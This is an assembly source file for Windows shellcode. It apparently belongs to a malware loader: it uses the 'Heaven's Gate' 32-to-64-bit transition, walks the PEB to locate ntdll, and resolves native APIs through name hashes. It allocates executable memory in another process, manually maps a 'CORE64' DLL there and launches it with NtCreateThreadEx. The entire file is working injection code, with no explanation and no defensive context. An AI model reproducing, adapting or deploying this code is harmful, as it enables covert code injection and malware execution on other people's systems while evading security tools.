;	Instructions
%define BREAK							db					0xcc

;	Constants
%define STACK_SIZE						512
%define CREATE_SUSPENDED				0

;	Variables
%define parameters						[rbp - 8]
%define ntdll_base						[rbp - 16]
%define ntdll_pe_header					[rbp - 24]
%define ntdll_eat						[rbp - 32]
%define numberofnames					[rbp - 40]
%define f_zwallocatevirtualmemory		[rbp - 48]
%define f_ntwritevirtualmemory			[rbp - 56]
%define f_ntcreatethread				[rbp - 64]
%define core64_base						[rbp - 72]
%define process_handle					[rbp - 80]
%define core64_pe						[rbp - 88]
%define remote_base						[rbp - 96]
%define working_memory					[rbp - 104]
%define core64_raw_size					[rbp - 112]
%define remote_rawdll					[rbp - 120]
%define core64_oep_rva					[rbp - 128]
%define shellcode_return				[rbp - 136]
%define heaven_abs_ret					[rbp - 144]
%define f_ntterminatethread				[rbp - 152]
%define remote_raw_core64				[rbp - 160]

section .text
	global	_start

_start:
;	eax is the CORE64 base address
use32
;	Entry point
	nop



;	CORE64 parameter saved in edx
	;add		esp, 4								; Scrap the return
	pop		ebx										; Return
	pop		edx										; Parameter
	nop
	nop
	

;	Heaven's gate into x64
	db		0xea
	dd		0
	dw		0x33
	nop												; Space
x86_reentry:
use64
	db		0xea									; Entry into x86 space from x64
	dd		0
	dw		0x23
	nop
use32
	ret												; Thread exits

;	x64 Mode Entry Jump into
SHELL64:
use64
	nop

	;BREAK
	;lea		rax, [rip + 5]
	;call	hash32
	;db	'ZwAllocateVirtualMemory',0

;	Setup stack frame
	push	rbp
	mov		rbp, rsp

;	Allocate stack space
	xor		al, al
	mov		rcx, STACK_SIZE
	sub		rsp, rcx
	mov		rdi, rsp
	cld
	rep		stosb

;	Commit CORE64 parameters
	;BREAK
	mov		shellcode_return, edx				; Commit return
	mov		parameters, rdx
	mov		eax, [rdx]							; Core64 Base
	mov		core64_base, eax
	mov		eax, [rdx + 4]						; OEP
	mov		core64_oep_rva, eax
	mov		eax, [rdx + 8]						; HANDLE
	mov		process_handle, eax
	mov		eax, [rdx + 12]						; Raw CORE64 size
	mov		core64_raw_size, eax

;	Get us the 64-bit ntdll.dll base
	mov		rax, [gs:0x30]
	mov		rax, [rax + 0x60]
	mov		rax, [rax + 0x18]
	mov		rax, [rax + 0x30]
	mov		rax, [rax + 0x10]
	mov		ntdll_base, rax

;	Get us to ntdll PE headers
	add		eax, [rax + 0x3c]
	mov		ntdll_pe_header, rax

;	Find the Export directory
	xor		rbx, rbx
	mov		ebx, [rax + 0x88]
	add		rbx, ntdll_base
	mov		ntdll_eat, rbx

;	Set NumberOfNames
	xor		rax, rax
	mov		eax, [rbx + 0x14]
	mov		numberofnames, rax

;	Set pointers and variables
;		name pointer: r15
;		ordinal pointer: r14
;		function counter: r13
;		target hash: r12d
	xor		r14, r14
	mov		r14d, [rbx + 0x24]
	add		r14, ntdll_base
	xor		r15, r15
	mov		r15d, [rbx + 0x20]
	add		r15, ntdll_base

;	Compute address of ZwAllocateVirtualMemory
	;BREAK
	xor		r12, r12
	mov		r12d, 0xe8ef18ee
	call	find_function
	mov		f_zwallocatevirtualmemory, rax

;	Compute address of NtWriteVirtualMemory
	xor		r12, r12
	mov		r12d, 0x8949135d
	call	find_function
	mov		f_ntwritevirtualmemory, rax

;	Compute address of NtCreateThreadEx
	xor		r12, r12
	mov		r12d, 0x1f963c27
	call	find_function
	mov		f_ntcreatethread, rax

;	Compute address of NtTerminateThread
	xor		r12, r12
	mov		r12d, 0x36d276ab
	call	find_function
	mov		f_ntterminatethread, rax

;	Compute CORE64 headers
	mov		rax, core64_base
	xor		rbx, rbx
	mov		ebx, [rax + 0x3c]
	add		rbx, core64_base
	mov		core64_pe, rbx							; Commit

;	Allocate remote memory
;	NTSTATUS ZwAllocateVirtualMemory(
;	  _In_     HANDLE ProcessHandle,				; rcx						0
;	  _Inout_  PVOID *BaseAddress,					; rdx						8
;	  _In_     ULONG_PTR ZeroBits,					; r8						16
;	  _Inout_  PSIZE_T RegionSize,					; r9 -> ptr					24
;	  _In_     ULONG AllocationType,				; r10						32
;	  _In_     ULONG Protect						; r11						40
;	);																			48		RegionSize
;																				56		BaseAddress
	mov		rcx, 48
	sub		rsp, rcx
	xor		al, al
	mov		rdi, rsp
	rep		stosb

	xor		rax, rax
	mov		eax, [rbx + 0x50]
	lea		r9, [rsp + 48]
	mov		[r9], rax

	mov		rcx, process_handle
	lea		rdx, [rsp + 56]
	;mov		rdx, 0x10000							; FIX
	xor		r8, r8

	mov		rax, 0x3000
	mov		[rsp + 32], eax
	mov		rax, 0x40
	mov		[rsp + 40], eax

	mov		rax, f_zwallocatevirtualmemory
	;BREAK
	call	rax

;	Commit base address
	mov		rax, [rsp + 56]
	cmp		rax, 0
	je		error_found
	;mov		qword rax, 0x10000					; FIX
	mov		remote_base, rax						; Commit
	add		rsp, 48

;	Allocate RAW CORE64 in remote memory
;	NTSTATUS ZwAllocateVirtualMemory(
;	  _In_     HANDLE ProcessHandle,				; rcx						0
;	  _Inout_  PVOID *BaseAddress,					; rdx						8
;	  _In_     ULONG_PTR ZeroBits,					; r8						16
;	  _Inout_  PSIZE_T RegionSize,					; r9 -> ptr					24
;	  _In_     ULONG AllocationType,				; r10						32
;	  _In_     ULONG Protect						; r11						40
;	);																			48		RegionSize
;																				56		BaseAddress
	mov		rcx, 48
	sub		rsp, rcx
	xor		al, al
	mov		rdi, rsp
	rep		stosb

	xor		rax, rax
	mov		eax, [rbx + 0x50]
	lea		r9, core64_raw_size
	mov		[r9], rax

	mov		rcx, process_handle
	lea		rdx, [rsp + 56]
	mov		qword [rdx], 0									; Give us a new address
	;mov		rdx, 0x10000							; FIX
	xor		r8, r8

	mov		rax, 0x3000
	mov		[rsp + 32], eax
	mov		rax, 0x40
	mov		[rsp + 40], eax

	mov		rax, f_zwallocatevirtualmemory
	;BREAK
	call	rax

;	Commit base address
	mov		rax, [rsp + 56]
	cmp		rax, 0
	je		error_found
	;mov		qword rax, 0x10000					; FIX
	mov		remote_raw_core64, rax						; Commit
	add		rsp, 48

;	Write RAW CORE64 DLL into remote memory space
;	Check if the right binary is being written
	;BREAK
	mov		rdi, rax
	mov		rsi, core64_base
	mov		rcx, core64_raw_size
	call	write_mem

;	Copy headers	
	mov		rdi, remote_base
	mov		rsi, core64_base
	mov		rbx, core64_pe
	xor		rcx, rcx
	mov		ecx, [rbx + 0x54]						; SizeOfHeaders
	call	write_mem

;	Copy segment loop
	; r15 = section header pointer
	; r14 = section header counter
	mov		r15, core64_pe
	mov		r14w, [r15 + 0x6]
	add		r15, 0x108								; First section header

copy_loop:
	
	; Compute destination
	mov		rdi, remote_base
	add		edi, [r15 + 0xc]						; VirtualAddress

	; Compute source
	mov		rsi, core64_base
	add		esi, [r15 + 0x14]						; PointerToRawData

	; Get size
	xor		rcx, rcx
	mov		ecx, [r15 + 0x10]						; SizeOfRawData

	; Copy
	call	write_mem

	; Test
	add		r15, 0x28
	dec		r14
	test	r14w, r14w
	jne		copy_loop

;	Allocate RAW_DLL in remote memory space
;	BREAK;
;	mov		rcx, 48
;	sub		rsp, rcx
;	xor		al, al
;	mov		rdi, rsp
;	rep		stosb
;
;	mov		rcx, process_handle
;	lea		rdx, [rsp + 56]
;	xor		r8, r8
;	lea		r9, [rsp + 48]
;	mov		eax, 0x2000
;	mov		[r9], eax
;
;	mov		rax, 0x3000
;	mov		[rsp + 32], eax
;	mov		rax, 0x40
;	mov		[rsp + 40], eax
;
;	mov		rax, f_zwallocatevirtualmemory
;	call	rax
;	mov		rax, [rsp + 56]
;	mov		remote_rawdll, rax
;	NTSTATUS ZwAllocateVirtualMemory(
;	  _In_     HANDLE ProcessHandle,				; rcx						0
;	  _Inout_  PVOID *BaseAddress,					; rdx						8
;	  _In_     ULONG_PTR ZeroBits,					; r8						16
;	  _Inout_  PSIZE_T RegionSize,					; r9 -> ptr					24
;	  _In_     ULONG AllocationType,				; r10						32
;	  _In_     ULONG Protect						; r11						40
;	);																			48		RegionSize
;																				56		BaseAddress

;	Allocate memory for structures
	mov		rcx, 48
	sub		rsp, rcx
	xor		al, al
	mov		rdi, rsp
	rep		stosb

	or		rcx, 0xffffffffffffffff
	lea		rdx, [rsp + 56]
	mov		qword [rdx], 0
	xor		r8, r8
	lea		r9, [rsp + 48]
	mov		eax, 0x2000
	mov		[r9], eax

	mov		rax, 0x3000
	mov		[rsp + 32], eax
	mov		rax, 0x40
	mov		[rsp + 40], eax

	mov		rax, f_zwallocatevirtualmemory
	call	rax
	mov		rax, [rsp + 56]
	mov		working_memory, rax

;	NTSTATUS ZwAllocateVirtualMemory(
;	  _In_     HANDLE ProcessHandle,				; rcx						0
;	  _Inout_  PVOID *BaseAddress,					; rdx						8
;	  _In_     ULONG_PTR ZeroBits,					; r8						16
;	  _Inout_  PSIZE_T RegionSize,					; r9 -> ptr					24
;	  _In_     ULONG AllocationType,				; r10						32
;	  _In_     ULONG Protect						; r11						40
;	);																			48		RegionSize
;																				56		BaseAddress

;	Create Buffer (reuse `working_memory`)
;struct NtCreateThreadExBuffer
; {
;   ULONG Size;							0					0000000000000048					CONSTANT SIZE
;   ULONG Unknown1;						8					0000000000010003					UNKNOWN CONSTANT
;   ULONG Unknown2;						16					0000000000000010					UNKNOWN CONSTANT
;   PULONG Unknown3;					24					000000000017f9b8					UNKNOWN PTR1
;   ULONG Unknown4;						32					0000000000000000					UNKNOWN CONSTANT
;   ULONG Unknown5;						40					0000000000010004					UNKNOWN CONSTANT
;   ULONG Unknown6;						48					0000000000000008					UNKNOWN CONSTANT
;   PULONG Unknown7;					56					000000000017f9a0					UNKNOWN PTR2
;   ULONG Unknown8;						64					0000000000000000					UNKNOWN CONSTANT
; };									72
	;BREAK
	mov		rbx, rax
	mov		qword [rbx + 0],		0x48							; Size
	mov		qword [rbx + 8],		0x10003							; U1
	mov		qword [rbx + 16],		0x10							; U2
	lea		rax, [rbx + 0x200]
	mov		[rbx + 24],				rax								; U3
	mov		qword [rbx + 40],		0x10004							; U5
	mov		qword [rbx + 48],		0x8								; U6
	lea		rax, [rbx + 0x400]
	mov		[rbx + 56],				rax								; U7
	
;typedef NTSTATUS (WINAPI *LPFUN_NtCreateThreadEx) 
; (
;   OUT PHANDLE hThread,									rcx -> Pointer to 64-bit HANDLE override			0000000000000000			0
;   IN ACCESS_MASK DesiredAccess,							rdx -> CONSTANT 0x1fffff							00000000001f5e60			8
;   IN LPVOID ObjectAttributes,								r8	-> CONSTANT 0									0000000000000000			16
;   IN HANDLE ProcessHandle,								r9  -> top 32-bit zero'd, low 32-bit HANDLE			00000000001f5e60			24
;   IN LPTHREAD_START_ROUTINE lpStartAddress,																	1111111122222222			32
;   IN LPVOID lpParameter,																						3333333344444444			40
;   IN BOOL CreateSuspended, 																					0000000000000001			48		CONSTANT
;   IN ULONG StackZeroBits,																						0000000000000000			56		CONSTANT
;   IN ULONG SizeOfStackCommit,																					0000000000000000			64		CONSTANT
;   IN ULONG SizeOfStackReserve,																				0000000000000000			72		CONSTANT
;   OUT LPVOID lpBytesBuffer																					000000000017fa00			80		PTR BUFFER
; );
	
;	Allocate memory for stack
	mov		qword rcx, 88
	sub		rsp, rcx
	xor		al, al
	cld
	mov		rdi, rsp
	rep		stosb

;	Allocate register parameters
	lea		rcx, [rbx + 0x600]						; PHANDLE OUT
	;mov		qword rdx, 0x1fffff						; DesiredAccess
	xor		r8, r8									; ObjectAttributes
	mov		qword r9, process_handle				; ProcessHandle

;	Commit OEP Parameter
	;BREAK
	mov		rax, core64_oep_rva
	add		rax, remote_base
	mov		[rsp + 32], rax

;	Other parameters
	mov		qword rdx, 0x1fffff						; DesiredAccess
	mov		qword [rsp + 48], CREATE_SUSPENDED		; BOOL CreateSuspended
	mov		[rsp + 80], rbx

;	Set the RAW CORE64 Parameter
	mov		rax, remote_raw_core64
	mov		[rsp + 40], rax

;	Call function
	;BREAK
	mov		rax, f_ntcreatethread
	call	rax

;	Realign Stack
	;BREAK
	mov		rax, f_ntterminatethread
	add		rsp, STACK_SIZE
	pop		rbp

;	Terminate
	push	0
	push	0
	xor		rcx, rcx
	xor		rdx, rdx
	;mov		rax, f_ntterminatethread
	call	rax

	BREAK
	nop

; rsi = local mem
; rdi = remote mem
; rcx = length
write_mem:
;NtWriteVirtualMemory(
;  IN HANDLE               ProcessHandle,							; rcx				0
;  IN PVOID                BaseAddress,								; rdx				8
;  IN PVOID                Buffer,									; r8				16
;  IN ULONG                NumberOfBytesToWrite,					; r9				24
;  OUT PULONG              NumberOfBytesWritten OPTIONAL );								32
	mov		rdx, rdi
	mov		r9,	rcx

	mov		rcx, 40
	sub		rsp, rcx
	xor		al, al
	mov		rdi, rsp
	rep		stosb

	mov		rcx, process_handle
	mov		r8, rsi

	mov		rax, f_ntwritevirtualmemory
	call	rax

	add		rsp, 40
	ret
	

;	Resolve export
find_function:
	xor		r13, r13

;	Enter enumerator loop. Compute name ptr in rax
find_function_loop:
	xor		rax, rax
	mov		eax, [r15 + 4 * r13]
	add		rax, ntdll_base
	call	hash32
	cmp		eax, r12d
	je		find_function_found
	inc		r13
	cmp		r13, numberofnames
	jne		find_function_loop
	xor		rax, rax
	ret

find_function_found:
;	Get ordinal value (WORD) in dx
	xor		rdx, rdx
	mov		dx, [r14 + 2 * r13]

;	Get function
	mov		rax, ntdll_eat
	mov		rbx, ntdll_base
	mov		eax, [rax + 0x1c]
	add		ebx, eax
	xor		rax, rax
	mov		eax, [rbx + 4 * rdx]
	add		rax, ntdll_base
	ret

;	rax = string
hash32:
	mov		rsi, rax
	xor		rax, rax
	xor		rcx, rcx
hash32_next:
	mov		cl, [rsi]
	lea		eax, [eax * 4 + eax]
	inc		rsi
	add		eax, ecx
	test	ecx, ecx
	jne		hash32_next
	ret

error_found:
;	Realign Stack
	;BREAK
	mov		rax, f_ntterminatethread
	add		rsp, STACK_SIZE
	pop		rbp

;	Terminate
	push	0
	push	0
	xor		rcx, rcx
	xor		rdx, rdx
	;mov		rax, f_ntterminatethread
	call	rax	

_strings:
;db	'ZwAllocateVirtualMemory'	;ed95dc78 e8ef18ee
;db	'NtWriteVirtualMemory'		;8949135d
;db	'NtCreateThread'			;42ff1690

	BREAK
	nop